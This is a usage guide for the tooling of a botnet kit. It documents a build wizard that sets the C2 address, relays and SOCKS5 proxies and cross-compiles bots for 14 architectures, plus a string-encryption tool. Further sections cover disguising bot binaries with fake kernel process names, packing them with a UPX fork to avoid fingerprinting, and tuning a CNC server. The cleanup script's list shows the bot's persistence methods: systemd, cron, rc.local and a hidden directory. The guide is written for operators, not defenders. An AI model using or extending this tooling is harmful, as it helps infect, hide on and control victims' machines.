Quick reference for everything in the `tools/` directory.

### setup.py (project root)

The main build wizard. Handles first-time setup and rebuilds.

- **Option 1 — Full Setup**: Prompts for C2 address, telnet port, auth secrets, relay endpoints, SOCKS5 credentials, generates TLS certs, rotates the AES key, encrypts all config blobs, and cross-compiles bot + CNC + relay binaries for 14 architectures.
- **Option 2 — Update C2 Only**: Changes the C2 address and re-obfuscates it without touching other config. Rebuilds bots + relay.
- **Option 3 — Relay Endpoints Update**: Changes relay endpoint list and SOCKS5 proxy credentials. Rebuilds bots + relay without touching C2/tokens/certs.

On every run it generates a unique random AES-128-CTR key, patches the XOR byte functions in `bot/opsec.go`, and re-encrypts all sensitive string blobs in `bot/config.go`.

---

### crypto.go

Standalone AES-128-CTR encrypt/decrypt tool. Uses the same key as the bot (patched by setup.py).

```
go run tools/crypto.go encrypt <string>              # Encrypt a plaintext string → hex blob
go run tools/crypto.go encrypt-slice <a> <b> ...     # Encrypt multiple strings as a null-separated slice
go run tools/crypto.go decrypt <hex>                 # Decrypt a hex blob → plaintext
go run tools/crypto.go decrypt-slice <hex>           # Decrypt a hex blob → string slice (one per line)
go run tools/crypto.go generate                      # Regenerate all encrypted blobs for config.go
go run tools/crypto.go verify                        # Verify config.go blobs decrypt correctly
go run tools/crypto.go resetconfig                   # Reset key + blobs back to zero-key source state
```

The `resetconfig` command is useful after a build when you want to restore the source code to its default shipping state (all blobs encrypted under the 0x00 key). This is the reverse of what setup.py does.

### build.sh

Cross-compiles the bot for 14 Linux architectures. Each binary gets a fake kernel process name (e.g., `kworkerd0`, `ethd0`, `ip6addrd`) to blend in on infected hosts. Applies `-trimpath -ldflags="-s -w"` to strip debug info, then compresses with m30w packer (zero UPX fingerprint).

Output goes to `bins/` in the project root.

### cleanup.sh

Emergency removal of all bot persistence artifacts from the local machine. Run as root if the bot was accidentally executed outside debug mode.

Removes:
- Systemd service 
- Hidden directory 
- Cron jobs (persistence script + all 14 bot binary names)
- rc.local entries
- Instance lock and speed cache 
- Running bot processes (all known binary names)

```
sudo bash tools/cleanup.sh
```

---

### fix_botkill.sh

Server-side tuning script. Increases file descriptor limits, opens port 443, and tunes TCP buffer sizes for handling large numbers of bot connections. Run on the CNC server before starting.

```
sudo bash tools/fix_botkill.sh
```

---

### upx (m30w packer)

Bundled m30w packer binary (custom UPX fork). Compresses bot binaries from ~8MB down to ~2.4MB with zero UPX fingerprint.
